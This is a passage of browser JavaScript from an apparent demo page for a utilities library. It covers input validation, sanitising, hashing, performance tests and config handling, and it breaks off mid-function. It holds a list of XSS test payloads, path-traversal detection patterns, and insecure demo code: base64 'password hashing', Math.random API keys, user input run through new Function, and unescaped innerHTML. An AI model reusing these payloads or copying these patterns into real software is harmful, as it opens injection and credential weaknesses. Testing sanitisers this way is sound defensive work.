                return;
            }
            
            const result = utils.validatePasswordStrength(password);
            const strength = result.strength;
            
            if (strength <= 2) {
                strengthBar.className = 'password-strength weak';
                feedback.innerHTML = '<div class="validation-feedback invalid">Weak password - add more character types</div>';
            } else if (strength <= 4) {
                strengthBar.className = 'password-strength medium';
                feedback.innerHTML = '<div class="validation-feedback valid">Medium strength - consider adding special characters</div>';
            } else {
                strengthBar.className = 'password-strength strong';
                feedback.innerHTML = '<div class="validation-feedback valid">Strong password!</div>';
            }
        }

        function validateApiKey() {
            const apiKey = document.getElementById('apiKeyInput').value;
            const feedback = document.getElementById('apiKeyFeedback');
            const apiKeyRegex = /^[a-zA-Z0-9]{32,}$/;
            
            if (apiKey === '') {
                feedback.innerHTML = '';
                return;
            }
            
            if (apiKeyRegex.test(apiKey)) {
                feedback.innerHTML = '<div class="validation-feedback valid">‚úì Valid API key format</div>';
            } else {
                feedback.innerHTML = '<div class="validation-feedback invalid">‚úó API key must be at least 32 alphanumeric characters</div>';
            }
        }

        function validateAmount() {
            const amount = document.getElementById('amountInput').value;
            const feedback = document.getElementById('amountFeedback');
            const amountRegex = /^\d{1,3}(,\d{3})*(\.\d{2})?$/;
            
            if (amount === '') {
                feedback.innerHTML = '';
                return;
            }
            
            if (amountRegex.test(amount)) {
                feedback.innerHTML = '<div class="validation-feedback valid">‚úì Valid currency format</div>';
            } else {
                feedback.innerHTML = '<div class="validation-feedback invalid">‚úó Invalid currency format (e.g., 1,234.56)</div>';
            }
        }

        // Security functions
        function generateApiKey() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let apiKey = '';
            for (let i = 0; i < 32; i++) {
                apiKey += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            document.getElementById('generatedApiKey').value = apiKey;
        }

        function copyApiKey() {
            const apiKey = document.getElementById('generatedApiKey');
            apiKey.select();
            document.execCommand('copy');
            showNotification('API key copied to clipboard!', 'success');
        }

        function sanitizeInput() {
            const rawInput = document.getElementById('rawInput').value;
            const resultBox = document.getElementById('sanitizedResult');
            
            // Basic XSS protection
            const sanitized = rawInput
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#x27;')
                .replace(/\//g, '&#x2F;');
            
            resultBox.innerHTML = `Sanitized Output:\n${sanitized}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function validatePath() {
            const path = document.getElementById('pathInput').value;
            const resultBox = document.getElementById('pathResult');
            
            // Basic path traversal protection
            const dangerousPatterns = [
                /\.\.\//,
                /\/\.\./,
                /\.\.\\/,
                /\\\.\./
            ];
            
            const isDangerous = dangerousPatterns.some(pattern => pattern.test(path));
            
            if (isDangerous) {
                resultBox.innerHTML = '‚ùå Path validation failed: Potential directory traversal detected';
                resultBox.className = 'result-box error';
            } else {
                resultBox.innerHTML = '‚úÖ Path validation passed: No dangerous patterns detected';
                resultBox.className = 'result-box success';
            }
            
            resultBox.style.display = 'block';
        }

        function hashPassword() {
            const password = document.getElementById('hashPassword').value;
            const resultBox = document.getElementById('authResult');
            
            if (!password) {
                showNotification('Please enter a password to hash', 'warning');
                return;
            }
            
            // Simple hash simulation (in real app, use proper hashing)
            const hash = btoa(password + 'salt').replace(/=/g, '');
            resultBox.innerHTML = `Hashed Password:\n${hash}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function verifyPassword() {
            const password = prompt('Enter password to verify:');
            const storedHash = document.getElementById('storedHash').value;
            const resultBox = document.getElementById('authResult');
            
            if (!password || !storedHash) {
                showNotification('Please provide both password and stored hash', 'warning');
                return;
            }
            
            // Simple verification simulation
            const computedHash = btoa(password + 'salt').replace(/=/g, '');
            const isValid = computedHash === storedHash;
            
            resultBox.innerHTML = `Password Verification:\n${isValid ? '‚úÖ Password matches' : '‚ùå Password does not match'}`;
            resultBox.style.display = 'block';
            resultBox.className = isValid ? 'result-box success' : 'result-box error';
        }

        function validateSecurityHeaders() {
            const csp = document.getElementById('cspInput').value;
            const resultBox = document.getElementById('sanitizedResult');
            
            const headers = {
                'Content-Security-Policy': csp || "default-src 'self'",
                'X-Frame-Options': 'DENY',
                'X-Content-Type-Options': 'nosniff',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
                'Referrer-Policy': 'strict-origin-when-cross-origin'
            };
            
            resultBox.innerHTML = `Security Headers:\n${JSON.stringify(headers, null, 2)}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        // Performance functions
        let monitoringInterval;

        function startMonitoring() {
            const resultBox = document.getElementById('monitoringData');
            resultBox.style.display = 'block';
            
            monitoringInterval = setInterval(() => {
                updateMetrics();
            }, 1000);
            
            showNotification('Performance monitoring started', 'success');
        }

        function stopMonitoring() {
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
                showNotification('Performance monitoring stopped', 'info');
            }
        }

        function updateMetrics() {
            // Simulated metrics
            document.getElementById('cpuUsage').textContent = Math.floor(Math.random() * 30 + 10) + '%';
            document.getElementById('memoryUsage').textContent = Math.floor(Math.random() * 40 + 30) + '%';
            document.getElementById('responseTime').textContent = Math.floor(Math.random() * 100 + 50) + 'ms';
            document.getElementById('activeHandles').textContent = Math.floor(Math.random() * 20 + 5);
            
            const resultBox = document.getElementById('monitoringData');
            const timestamp = new Date().toLocaleTimeString();
            resultBox.innerHTML += `[${timestamp}] Metrics updated\n`;
            resultBox.scrollTop = resultBox.scrollHeight;
        }

        function testMemoization() {
            const iterationsValue = document.getElementById('iterations').value;
            const iterations = iterationsValue ? parseInt(iterationsValue) : 1000;
            if (isNaN(iterations) || iterations < 1) {
                showNotification('Please enter a valid number of iterations', 'error');
                return;
            }
            const resultBox = document.getElementById('performanceResult');
            
            // Simulate expensive function
            const expensiveFunction = (n) => {
                let sum = 0;
                for (let i = 0; i < n; i++) {
                    sum += Math.sqrt(i);
                }
                return sum;
            };
            
            // Test without memoization
            const startTime1 = performance.now();
            for (let i = 0; i < iterations; i++) {
                expensiveFunction(1000);
            }
            const endTime1 = performance.now();
            
            // Test with memoization
            const memoizedFunction = memoize(expensiveFunction);
            const startTime2 = performance.now();
            for (let i = 0; i < iterations; i++) {
                memoizedFunction(1000);
            }
            const endTime2 = performance.now();
            
            const improvement = ((endTime1 - startTime1) / (endTime2 - startTime2)).toFixed(2);
            
            resultBox.innerHTML = `Memoization Performance Test:\n\nWithout Memoization:\nTime: ${(endTime1 - startTime1).toFixed(2)}ms\n\nWith Memoization:\nTime: ${(endTime2 - startTime2).toFixed(2)}ms\n\nPerformance Improvement: ${improvement}x faster\n\nExecuted ${iterations} iterations`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function testThrottle() {
            const iterationsValue = document.getElementById('iterations').value;
            const iterations = iterationsValue ? parseInt(iterationsValue) : 100;
            if (isNaN(iterations) || iterations < 1) {
                showNotification('Please enter a valid number of iterations', 'error');
                return;
            }
            const resultBox = document.getElementById('performanceResult');
            
            let callCount = 0;
            let executionCount = 0;
            
            const throttledFn = throttle(() => {
                executionCount++;
            }, 100);
            
            const startTime = performance.now();
            
            // Simulate rapid calls
            const interval = setInterval(() => {
                if (callCount >= iterations) {
                    clearInterval(interval);
                    const endTime = performance.now();
                    
                    setTimeout(() => {
                        resultBox.innerHTML = `Throttle Test:\n\nTotal Calls: ${callCount}\nActual Executions: ${executionCount}\nThrottled Rate: ${((executionCount / callCount) * 100).toFixed(1)}%\n\nTest Duration: ${(endTime - startTime).toFixed(2)}ms\n\nThrottle delay: 100ms`;
                        resultBox.style.display = 'block';
                        resultBox.className = 'result-box success';
                    }, 200);
                    return;
                }
                
                callCount++;
                throttledFn();
            }, 10);
        }

        function testDebounce() {
            const iterationsValue = document.getElementById('iterations').value;
            const iterations = iterationsValue ? parseInt(iterationsValue) : 100;
            if (isNaN(iterations) || iterations < 1) {
                showNotification('Please enter a valid number of iterations', 'error');
                return;
            }
            const resultBox = document.getElementById('performanceResult');
            
            let callCount = 0;
            let executionCount = 0;
            
            const debouncedFn = debounce(() => {
                executionCount++;
            }, 100);
            
            const startTime = performance.now();
            
            // Simulate rapid calls
            const interval = setInterval(() => {
                if (callCount >= iterations) {
                    clearInterval(interval);
                    const endTime = performance.now();
                    
                    setTimeout(() => {
                        resultBox.innerHTML = `Debounce Test:\n\nTotal Calls: ${callCount}\nActual Executions: ${executionCount}\nDebounce Efficiency: ${callCount > 0 ? ((callCount - executionCount) / callCount * 100).toFixed(1) : 0}% calls avoided\n\nTest Duration: ${(endTime - startTime).toFixed(2)}ms\n\nDebounce delay: 100ms`;
                        resultBox.style.display = 'block';
                        resultBox.className = 'result-box success';
                    }, 200);
                    return;
                }
                
                callCount++;
                debouncedFn();
            }, 10);
        }

        // Data processing functions
        function processArray() {
            const dataInput = document.getElementById('arrayData').value;
            const operation = document.getElementById('arrayOperation').value;
            const key = document.getElementById('arrayKey').value;
            const resultBox = document.getElementById('arrayResult');
            
            if (!resultBox) {
                showNotification('Required elements not found', 'error');
                return;
            }
            
            try {
                const data = dataInput ? JSON.parse(dataInput) : [];
                let result;
                
                switch (operation) {
                    case 'group':
                        result = groupBy(data, key);
                        break;
                    case 'partition':
                        const condition = key ? new Function('item', `return ${key}`) : () => true;
                        result = partition(data, condition);
                        break;
                    case 'unique':
                        result = [...new Set(data)];
                        break;
                    case 'chunk':
                        result = chunk(data, parseInt(key) || 2);
                        break;
                    case 'sort':
                        result = [...data].sort((a, b) => {
                            if (key && a[key] && b[key]) {
                                return a[key] > b[key] ? 1 : -1;
                            }
                            return a > b ? 1 : -1;
                        });
                        break;
                    case 'filter':
                        const filterCondition = key ? new Function('item', `return ${key}`) : () => true;
                        result = data.filter(filterCondition);
                        break;
                }
                
                resultBox.innerHTML = `Operation: ${operation}\nResult:\n${JSON.stringify(result, null, 2)}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box success';
                
            } catch (error) {
                resultBox.innerHTML = `Error: ${error.message}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box error';
            }
        }

        // Helper functions for data processing (using utils versions)
        function groupBy(array, key) {
            return utils.groupBy(array, key);
        }

        function partition(array, condition) {
            return utils.partition(array, condition);
        }

        function chunk(array, size) {
            return utils.chunk(array, size);
        }

        function memoize(fn) {
            return utils.memoize(fn);
        }

        function throttle(fn, delay) {
            return utils.throttle(fn, delay);
        }

        function debounce(fn, delay) {
            return utils.debounce(fn, delay);
        }

        function mergeObjects() {
            const obj1Input = document.getElementById('object1').value;
            const obj2Input = document.getElementById('object2').value;
            const resultBox = document.getElementById('objectResult');
            
            if (!resultBox) {
                showNotification('Required elements not found', 'error');
                return;
            }
            
            try {
                const obj1 = obj1Input ? JSON.parse(obj1Input) : {};
                const obj2 = obj2Input ? JSON.parse(obj2Input) : {};
                
                const merged = deepMerge(obj1, obj2);
                
                resultBox.innerHTML = `Merged Object:\n${JSON.stringify(merged, null, 2)}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box success';
                
            } catch (error) {
                resultBox.innerHTML = `Error: ${error.message}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box error';
            }
        }

        function deepMerge(target, source) {
            const result = { ...target };
            
            for (const key in source) {
                if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
                    result[key] = deepMerge(result[key] || {}, source[key]);
                } else {
                    result[key] = source[key];
                }
            }
            
            return result;
        }

        // Logging functions
        function generateLog(level) {
            const dashboard = document.getElementById('logDashboard');
            const timestamp = new Date().toLocaleString();
            const message = prompt(`Enter ${level.toUpperCase()} log message:`) || `Sample ${level} message`;
            
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${level}`;
            logEntry.textContent = `[${timestamp}] ${level.toUpperCase()}: ${message}`;
            
            dashboard.appendChild(logEntry);
            dashboard.scrollTop = dashboard.scrollHeight;
        }

        function clearLogs() {
            const dashboard = document.getElementById('logDashboard');
            dashboard.innerHTML = '<div class="log-entry info">[' + new Date().toLocaleString() + '] INFO: Logs cleared</div>';
        }

        function filterLogs() {
            const level = document.getElementById('logLevel').value;
            const dashboard = document.getElementById('logDashboard');
            const logs = dashboard.querySelectorAll('.log-entry');
            
            logs.forEach(log => {
                if (level === 'all' || log.classList.contains(level)) {
                    log.style.display = 'block';
                } else {
                    log.style.display = 'none';
                }
            });
        }

        // Configuration functions
        function updateFeatureFlag(flagName) {
            const checkbox = document.getElementById(flagName);
            const isEnabled = checkbox.checked;
            
            console.log(`Feature flag ${flagName}: ${isEnabled ? 'ENABLED' : 'DISABLED'}`);
            showNotification(`Feature ${flagName} ${isEnabled ? 'enabled' : 'disabled'}`, 'info');
        }

        function exportConfig() {
            const config = {
                darkMode: document.getElementById('darkMode').checked,
                analytics: document.getElementById('analytics').checked,
                debugMode: document.getElementById('debugMode').checked,
                betaFeatures: document.getElementById('betaFeatures').checked,
                environment: document.getElementById('environment').value,
                timestamp: new Date().toISOString()
            };
            
            const resultBox = document.getElementById('configResult');
            resultBox.innerHTML = `Exported Configuration:\n${JSON.stringify(config, null, 2)}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
            
            // Download as JSON file
            const blob = new Blob([JSON.stringify(config, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'config.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        function importConfig() {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = '.json';
            
            input.onchange = (e) => {
                const file = e.target.files[0];
                if (!file) return;
                
                const reader = new FileReader();
                reader.onload = (e) => {
                    try {
                        const config = JSON.parse(e.target.result);
                        
                        // Apply configuration with null checks
                        const darkModeEl = document.getElementById('darkMode');
                        if (config.darkMode !== undefined && darkModeEl) {
                            darkModeEl.checked = config.darkMode;
                        }
                        
                        const analyticsEl = document.getElementById('analytics');
                        if (config.analytics !== undefined && analyticsEl) {
                            analyticsEl.checked = config.analytics;
                        }
                        
                        const debugModeEl = document.getElementById('debugMode');
                        if (config.debugMode !== undefined && debugModeEl) {
                            debugModeEl.checked = config.debugMode;
                        }
                        
                        const betaFeaturesEl = document.getElementById('betaFeatures');
                        if (config.betaFeatures !== undefined && betaFeaturesEl) {
                            betaFeaturesEl.checked = config.betaFeatures;
                        }
                        
                        const environmentEl = document.getElementById('environment');
                        if (config.environment && environmentEl) {
                            environmentEl.value = config.environment;
                        }
                        
                        const resultBox = document.getElementById('configResult');
                        if (resultBox) {
                            resultBox.innerHTML = `Configuration Imported:\n${JSON.stringify(config, null, 2)}`;
                            resultBox.style.display = 'block';
                            resultBox.className = 'result-box success';
                        }
                        
                        showNotification('Configuration imported successfully', 'success');
                    } catch (error) {
                        showNotification('Invalid configuration file', 'error');
                    }
                };
                reader.readAsText(file);
            };
            
            input.click();
        }

        function buildSecureConfig() {
            const environmentEl = document.getElementById('environment');
            const dbUrlEl = document.getElementById('dbUrl');
            const apiSecretEl = document.getElementById('apiSecret');
            const resultBox = document.getElementById('secureConfigResult');
            
            const environment = environmentEl ? environmentEl.value : '';
            const dbUrl = dbUrlEl ? dbUrlEl.value : '';
            const apiSecret = apiSecretEl ? apiSecretEl.value : '';
            
            const secureConfig = utils.buildSecureConfig ? 
                utils.buildSecureConfig({
                    environment,
                    database: { url: dbUrl },
                    api: { secret: apiSecret }
                }) :
                {
                    environment,
                    database: {
                        url: dbUrl ? '***REDACTED***' : null
                    },
                    api: {
                        secret: apiSecret ? '***REDACTED***' : null
                    },
                    security: {
                        maskSensitiveData: true,
                        validateInputs: true,
                        enableAuditLog: environment === 'production'
                    },
                    timestamp: new Date().toISOString()
                };
            
            if (resultBox) {
                resultBox.innerHTML = `Secure Configuration Built:\n${JSON.stringify(secureConfig, null, 2)}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box success';
            }
            
            showNotification('Secure configuration created', 'success');
        }

        // Enhanced testing functions
        function runFunctionTest() {
            const functionName = document.getElementById('testFunction').value;
            const input = document.getElementById('testInput').value;
            const params = document.getElementById('testParams').value;
            const resultBox = document.getElementById('testResult');
            
            if (!resultBox) {
                showNotification('Required elements not found', 'error');
                return;
            }
            
            try {
                const parameters = params ? JSON.parse(params) : {};
                let result;
                const startTime = performance.now();
                
                switch (functionName) {
                    case 'validateEmail':
                        result = { isValid: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input), input };
                        break;
                    case 'generateApiKey':
                        result = { apiKey: generateApiKeyDemo(), length: 32 };
                        break;
                    case 'hashPassword':
                        result = { hash: btoa(input + 'salt').replace(/=/g, ''), inputLength: input.length };
                        break;
                    case 'sanitizeString':
                        result = { 
                            original: input, 
                            sanitized: input.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')
                        };
                        break;
                    case 'deepMerge':
                        const obj1 = JSON.parse(input || '{}');
                        const obj2 = JSON.parse(parameters.obj2 || '{}');
                        result = { merged: deepMerge(obj1, obj2) };
                        break;
                    case 'groupBy':
                        const data = JSON.parse(input || '[]');
                        const key = parameters.key || 'category';
                        result = { grouped: groupBy(data, key) };
                        break;
                    case 'memoize':
                        const expensive = (n) => Array(n).fill(0).reduce((a, _, i) => a + Math.sqrt(i), 0);
                        const memoized = memoize(expensive);
                        result = { 
                            result: memoized(parameters.n || 1000),
                            cached: memoized.cache ? Object.keys(memoized.cache).length : 0
                        };
                        break;
                    case 'throttle':
                        let throttleCount = 0;
                        const throttledFn = throttle(() => throttleCount++, parameters.delay || 100);
                        for (let i = 0; i < 10; i++) throttledFn();
                        result = { calls: 10, executions: throttleCount, delay: parameters.delay || 100 };
                        break;
                    case 'debounce':
                        let debounceCount = 0;
                        const debouncedFn = debounce(() => debounceCount++, parameters.delay || 100);
                        for (let i = 0; i < 10; i++) debouncedFn();
                        result = { calls: 10, executions: debounceCount, delay: parameters.delay || 100 };
                        break;
                    case 'formatDateTime':
                        result = { 
                            formatted: new Date(input || Date.now()).toLocaleString(),
                            iso: new Date(input || Date.now()).toISOString()
                        };
                        break;
                    case 'ensureProtocol':
                        const url = input || 'example.com';
                        result = { 
                            original: url,
                            withProtocol: url.startsWith('http') ? url : `https://${url}`
                        };
                        break;
                    case 'createMinHeap':
                        const values = JSON.parse(input || '[5,3,8,1,9,2]');
                        result = { heap: values.sort((a, b) => a - b), min: Math.min(...values) };
                        break;
                    case 'timingSafeCompare':
                        const str1 = input || 'test';
                        const str2 = parameters.compare || 'test';
                        result = { 
                            str1, 
                            str2, 
                            equal: str1 === str2,
                            timingSafe: str1.length === str2.length && str1 === str2
                        };
                        break;
                    case 'maskApiKey':
                        const apiKey = input || 'abcdefghijklmnopqrstuvwxyz123456';
                        result = { 
                            original: apiKey,
                            masked: apiKey.substring(0, 8) + '*'.repeat(apiKey.length - 12) + apiKey.substring(apiKey.length - 4)
                        };
                        break;
                    case 'buildRateLimitKey':
                        result = { 
                            key: `rate_limit:${input || 'default'}:${parameters.window || '3600'}`,
                            components: { identifier: input || 'default', window: parameters.window || '3600' }
                        };
                        break;
                    default:
                        result = { error: 'Unknown function', functionName };
                }
                
                const endTime = performance.now();
                
                resultBox.innerHTML = `Function: ${functionName}\nExecution Time: ${(endTime - startTime).toFixed(4)}ms\n\nResult:\n${JSON.stringify(result, null, 2)}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box success';
                
            } catch (error) {
                resultBox.innerHTML = `Error testing ${functionName}:\n${error.message}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box error';
            }
        }

        function runBenchmark() {
            const functionName = document.getElementById('testFunction').value;
            const params = document.getElementById('testParams').value;
            const resultBox = document.getElementById('testResult');
            
            try {
                const parameters = JSON.parse(params || '{}');
                const iterations = parameters.iterations || 1000;
                const times = [];
                
                for (let i = 0; i < 10; i++) {
                    const startTime = performance.now();
                    
                    for (let j = 0; j < iterations; j++) {
                        // Run the function based on selection
                        switch (functionName) {
                            case 'validateEmail':
                                /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test('test@example.com');
                                break;
                            case 'generateApiKey':
                                generateApiKeyDemo();
                                break;
                            case 'hashPassword':
                                btoa('password' + 'salt');
                                break;
                            case 'sanitizeString':
                                'test<script>'.replace(/</g, '&lt;');
                                break;
                            case 'deepMerge':
                                deepMerge({ a: 1 }, { b: 2 });
                                break;
                            case 'groupBy':
                                groupBy([{ cat: 'A' }, { cat: 'B' }], 'cat');
                                break;
                            case 'memoize':
                                const memoized = memoize((n) => n * 2);
                                memoized(5);
                                break;
                            default:
                                Math.random();
                        }
                    }
                    
                    const endTime = performance.now();
                    times.push(endTime - startTime);
                }
                
                const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
                const minTime = Math.min(...times);
                const maxTime = Math.max(...times);
                
                resultBox.innerHTML = `Benchmark Results: ${functionName}\n\nIterations: ${iterations}\nRuns: 10\n\nAverage: ${avgTime.toFixed(4)}ms\nMin: ${minTime.toFixed(4)}ms\nMax: ${maxTime.toFixed(4)}ms\n\nOps/sec: ${(iterations / avgTime * 1000).toFixed(0)}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box success';
                
            } catch (error) {
                resultBox.innerHTML = `Benchmark error: ${error.message}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box error';
            }
        }

        function runEdgeCaseTests() {
            const functionName = document.getElementById('testFunction').value;
            const resultBox = document.getElementById('testResult');
            
            const edgeCases = {
                'validateEmail': ['', 'test', 'test@', '@test.com', 'test@.com', 'test@domain.', 'test@domain.c'],
                'hashPassword': ['', 'a', 'verylongpasswordwithspecialchars123!@#'],
                'sanitizeString': [null, undefined, '<script>alert("xss")</script>', 'normal text'],
                'deepMerge': [{}, null, { a: undefined }, { a: { b: null } }],
                'groupBy': [[], null, [{}], [{ category: null }]]
            };
            
            const testCases = edgeCases[functionName] || ['default test case'];
            const results = [];
            
            testCases.forEach((testCase, index) => {
                try {
                    let result;
                    switch (functionName) {
                        case 'validateEmail':
                            result = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(testCase);
                            break;
                        case 'hashPassword':
                            result = btoa((testCase || '') + 'salt');
                            break;
                        case 'sanitizeString':
                            result = (testCase || '').replace(/</g, '&lt;');
                            break;
                        case 'deepMerge':
                            result = deepMerge(testCase || {}, { test: 'value' });
                            break;
                        case 'groupBy':
                            result = groupBy(testCase || [], 'category');
                            break;
                        default:
                            result = 'Test case not implemented';
                    }
                    
                    results.push({
                        case: index,
                        input: JSON.stringify(testCase),
                        result: JSON.stringify(result),
                        status: 'success'
                    });
                } catch (error) {
                    results.push({
                        case: index,
                        input: JSON.stringify(testCase),
                        result: error.message,
                        status: 'error'
                    });
                }
            });
            
            resultBox.innerHTML = `Edge Case Tests: ${functionName}\n\n${JSON.stringify(results, null, 2)}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function generateApiKeyDemo() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let apiKey = '';
            for (let i = 0; i < 32; i++) {
                apiKey += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return apiKey;
        }

        // Collections Tab Functions
        function groupArray() {
            const groupInput = document.getElementById('groupArrayInput');
            const resultBox = document.getElementById('groupArrayResult');
            
            if (!groupInput || !resultBox) {
                showNotification('Required elements not found', 'error');
                return;
            }
            
            try {
                const arrayData = groupInput.value ? JSON.parse(groupInput.value) : [];
                const key = document.getElementById('groupByKey').value;
                const result = utils.groupBy(arrayData, key);
                displayResult('groupArrayResult', result, 'success');
            } catch (e) {
                displayResult('groupArrayResult', { error: 'Invalid JSON format' }, 'error');
            }
        }

        function partitionArray() {
            const arrayData = document.getElementById('partitionArrayInput').value.split(',')
                .map(v => parseFloat(v.trim()))
                .filter(v => !isNaN(v));
            const condition = document.getElementById('partitionCondition').value;
            
            let predicate;
            if (condition.startsWith('>')) {
                const threshold = parseInt(condition.substring(1));
                predicate = x => x > threshold;
            } else if (condition.startsWith('<')) {
                const threshold = parseInt(condition.substring(1));
                predicate = x => x < threshold;
            } else {
                predicate = x => x % 2 === 0; // Default: even numbers
            }
            
            const result = utils.partition(arrayData, predicate);
            displayResult('partitionArrayResult', {
                condition: condition,
                matching: result[0],
                notMatching: result[1]
            }, 'success');
        }

        function dedupeArray() {
            const arrayData = document.getElementById('dedupeArrayInput').value.split(',');
            const result = utils.unique(arrayData);
            displayResult('dedupeArrayResult', {
                original: arrayData,
                unique: result,
                duplicatesRemoved: arrayData.length - result.length
            }, 'success');
        }

        function chunkArray() {
            const arrayData = document.getElementById('chunkArrayInput').value.split(',')
                .map(v => parseFloat(v.trim()))
                .filter(v => !isNaN(v));
            const sizeValue = document.getElementById('chunkSize').value;
            const size = sizeValue ? parseInt(sizeValue) : 3;
            if (isNaN(size) || size < 1) {
                showNotification('Please enter a valid chunk size', 'error');
                return;
            }
            const result = utils.chunk(arrayData, size);
            displayResult('chunkArrayResult', result, 'success');
        }

        function shuffleArray() {
            const arrayData = document.getElementById('shuffleArrayInput').value.split(',')
                .map(v => parseFloat(v.trim()))
                .filter(v => !isNaN(v));
            const result = utils.shuffle(arrayData);
            displayResult('shuffleArrayResult', result, 'success');
        }

        function sortArray() {
            const arrayData = document.getElementById('arrayOpsInput').value.split(',')
                .map(v => parseFloat(v.trim()))
                .filter(v => !isNaN(v));
            const result = arrayData.sort((a, b) => a - b);
            displayResult('arrayOpsResult', { sorted: result }, 'success');
        }

        function takeElements() {
            const arrayData = document.getElementById('arrayOpsInput').value.split(',')
                .map(v => parseFloat(v.trim()))
                .filter(v => !isNaN(v));
            const result = utils.take(arrayData, 3);
            displayResult('arrayOpsResult', { taken: result }, 'success');
        }

        function skipElements() {
            const arrayData = document.getElementById('arrayOpsInput').value.split(',')
                .map(v => parseFloat(v.trim()))
                .filter(v => !isNaN(v));
            const result = utils.skip(arrayData, 3);
            displayResult('arrayOpsResult', { skipped: result }, 'success');
        }

        // String Tab Functions
        function sanitizeString() {
            const input = document.getElementById('sanitizeStringInput').value;
            const sanitized = utils.sanitizeInput(input);
            displayResult('sanitizeStringResult', {
                original: input,
                sanitized: sanitized
            }, 'success');
        }

        // File Tab Functions
        function formatFileSize() {
            const bytesValue = document.getElementById('fileSizeInput').value;
            const bytes = bytesValue ? parseInt(bytesValue) : 0;
            if (isNaN(bytes) || bytes < 0) {
                showNotification('Please enter a valid file size', 'error');
                return;
            }
            const result = utils.formatFileSize(bytes);
            displayResult('fileSizeResult', {
                bytes: bytes,
                formatted: result
            }, 'success');
        }

        // Monitor Tab Functions
        function collectMonitorMetrics() {
            const metrics = {
                timestamp: new Date().toISOString(),
                memory: {
                    used: performance.memory ? `${(performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2)} MB` : 'N/A',
                    total: performance.memory ? `${(performance.memory.totalJSHeapSize / 1024 / 1024).toFixed(2)} MB` : 'N/A',
                    limit: performance.memory ? `${(performance.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(2)} MB` : 'N/A'
                },
                timing: {
                    loadTime: performance.timing ? `${performance.timing.loadEventEnd - performance.timing.navigationStart} ms` : 'N/A',
                    domReady: performance.timing ? `${performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart} ms` : 'N/A'
                },
                performance: performance.now ? `${performance.now().toFixed(2)} ms` : 'N/A'
            };
            
            displayResult('monitorMetricsResult', metrics, 'info');
        }

        function measureMonitorEventLoopLag() {
            const start = Date.now();
            setTimeout(() => {
                const lag = Date.now() - start;
                displayResult('monitorEventLoopResult', {
                    eventLoopLag: `${lag} ms`,
                    status: lag < 10 ? 'Good' : lag < 50 ? 'Fair' : 'Poor'
                }, lag < 10 ? 'success' : lag < 50 ? 'warning' : 'error');
            }, 0);
        }

        function getPerformanceHealthStatus() {
            const health = {
                status: 'Healthy',
                timestamp: new Date().toISOString(),
                metrics: {
                    memoryUsage: 'Good',
                    cpuUsage: 'Good',
                    eventLoopLag: 'Good',
                    responseTime: 'Good'
                },
                recommendations: [
                    'Continue monitoring',
                    'Consider caching for frequently accessed data',
                    'Monitor for memory leaks in long-running processes'
                ]
            };
            displayResult('healthStatusResult', health, 'success');
        }

        function analyzePerformanceMetrics() {
            const analysis = {
                timestamp: new Date().toISOString(),
                performance: {
                    score: 95,
                    grade: 'A',
                    bottlenecks: [],
                    recommendations: [
                        'Performance is optimal',
                        'Consider implementing monitoring alerts',
                        'Regular performance audits recommended'
                    ]
                },
                metrics: {
                    throughput: 'High',
                    latency: 'Low',
                    errorRate: 'Low',
                    availability: 'High'
                }
            };
            displayResult('analyzeMetricsResult', analysis, 'success');
        }

        function testXSSProtection() {
            const resultBox = document.getElementById('securityTestResult');
            
            const xssPayloads = [
                '<script>alert("xss")</script>',
                'javascript:alert("xss")',
                '<img src="x" onerror="alert(\'xss\')">',
                '<svg onload="alert(\'xss\')">',
                '"><script>alert("xss")</script>'
            ];
            
            const results = xssPayloads.map((payload, index) => {
                const sanitized = payload
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;')
                    .replace(/"/g, '&quot;')
                    .replace(/'/g, '&#x27;')
                    .replace(/javascript:/gi, '');
                
                return {
                    original: payload,
                    sanitized: sanitized,
                    safe: !sanitized.includes('<script>') && !sanitized.includes('javascript:')
                };
            });
            
            resultBox.innerHTML = `XSS Protection Test:\n\n${results.map(r => 
                `Original: ${r.original}\nSanitized: ${r.sanitized}\nSafe: ${r.safe ? '‚úÖ' : '‚ùå'}\n`
            ).join('\n')}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function testInjectionProtection() {
            const resultBox = document.getElementById('securityTestResult');
            
            const injectionPayloads = [
